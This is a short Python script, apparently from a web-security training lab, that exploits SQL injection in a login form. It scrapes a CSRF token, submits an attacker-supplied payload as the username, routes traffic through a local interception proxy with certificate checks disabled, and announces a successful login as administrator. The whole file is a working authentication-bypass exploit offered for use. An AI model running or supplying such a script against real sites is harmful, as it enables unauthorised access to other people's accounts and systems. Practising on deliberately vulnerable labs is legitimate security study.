import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')    
    input_tag = soup.find("input")
    if input_tag:
        csrf = input_tag['value']
        print("[+] CSRF token found:", csrf)
        return csrf
    else:
        print("[-] CSRF token not found!")
        sys.exit(1)

def exploit_sqli(s, url, payload):
    csrf_token = get_csrf_token(s, url)
    data = {
        "csrf": csrf_token,
        "username": payload,
        "password": "randomtext"
    }
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(1)
    
    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print("[+] Logged in as administrator!")
    else:
        print("[-] Can't log in!")
